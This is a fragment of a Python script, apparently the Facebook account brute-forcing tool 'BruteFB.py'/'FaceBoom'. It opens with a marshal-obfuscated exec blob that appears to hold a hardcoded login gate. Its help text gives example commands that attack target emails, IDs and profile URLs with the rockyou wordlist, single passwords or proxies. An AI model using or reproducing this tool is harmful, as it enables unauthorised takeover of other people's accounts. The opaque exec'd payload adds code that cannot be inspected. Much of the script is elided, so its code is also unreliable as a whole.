...
yl="\033[1;33m" #>Yellow#
#########################
#Compiled By Tegar ID
#Github : https://github.com/Tegar-ID
import marshal
exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x80\x00\x00\x00e\x00\x00j\x01\x00d\x00\x00\x83\x01\x00\x01d\x01\x00Z\x02\x00d\x02\x00Z\x03\x00d\x03\x00\x84\x00\x00Z\x04\x00d\x04\x00Z\x05\x00xQ\x00e\x05\x00d\x05\x00k\x05\x00r{\x00e\x06\x00d\x06\x00\x83\x01\x00Z\x07\x00e\x06\x00d\x07\x00\x83\x01\x00Z\x08\x00e\x04\x00e\x07\x00e\x08\x00\x83\x02\x00Z\t\x00e\t\x00e\n\x00k\x02\x00rs\x00d\x08\x00GHPq+\x00d\t\x00GHq+\x00Wd\n\x00S(\x0b\x00\x00\x00t\x05\x00\x00\x00cleart\r\x00\x00\x00Tersakiti0607t\x06\x00\x00\x00060709c\x02\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s+\x00\x00\x00|\x00\x00t\x00\x00k\x03\x00r!\x00|\x01\x00t\x01\x00k\x03\x00r!\x00t\x02\x00}\x02\x00n\x06\x00t\x03\x00}\x02\x00|\x02\x00S(\x01\x00\x00\x00N(\x04\x00\x00\x00t\x08\x00\x00\x00usernamet\x08\x00\x00\x00passwordt\x05\x00\x00\x00Falset\x04\x00\x00\x00True(\x03\x00\x00\x00t\t\x00\x00\x00user_namet\t\x00\x00\x00pass_wordt\x05\x00\x00\x00hasil(\x00\x00\x00\x00(\x00\x00\x00\x00s\n\x00\x00\x00<htr-tech>t\x05\x00\x00\x00login\x05\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x18\x01\t\x02\x06\x02i\x03\x00\x00\x00i\x01\x00\x00\x00s\x12\x00\x00\x00\x1b[0;37mUsername : s\x12\x00\x00\x00\x1b[0;37mPassword : t\x06\x00\x00\x00SUCCESs*\x00\x00\x00                 \x1b[1;31m[\xc3\x97] LOGIN FAILED!N(\x0b\x00\x00\x00t\x02\x00\x00\x00ost\x06\x00\x00\x00systemR\x03\x00\x00\x00R\x04\x00\x00\x00R\n\x00\x00\x00t\x01\x00\x00\x00it\x05\x00\x00\x00inputt\t\x00\x00\x00userName_t\t\x00\x00\x00password_R\t\x00\x00\x00R\x06\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\n\x00\x00\x00<htr-tech>t\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x18\x00\x00\x00\r\x01\x06\x01\x06\x02\t\x08\x06\x01\x0f\x01\x0c\x01\x0c\x01\x0f\x01\x0c\x01\x05\x01\x04\x03'))
os.system("cls||clear")
def write(text):
...
class FaceBoom(object):
    ...
    def banner(self,target,wordlist,single_passwd):
        ...
        proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+""+rd+""+yl+""
        print(gr+"""════════════════════════════════════════════
[√] Target      : """+wi+target+gr+"""
...
\033[1;31mAuthor :Mr.S4dB0y - Team :DESTROYER_Team
\33[0;37m-------------
OPTIONS:
       |
    |--------
    ...
    |--------
    | -g <TARGET Facebook Profile URL> [Specify Target Facebook Profile]
    |--------
-------------
Examples:
        |
     |--------
     | python BruteFB.py -t example@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python BruteFB.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python BruteFB.py -t example@hotmail.com -w wordlist.txt -p 144.217.101.245:3129
     |--------
     | python BruteFB.py -t example@gmail.com -s 1234567
     |--------
     | python BruteFB.py -g https://www.facebook.com/example
     |--------
""")
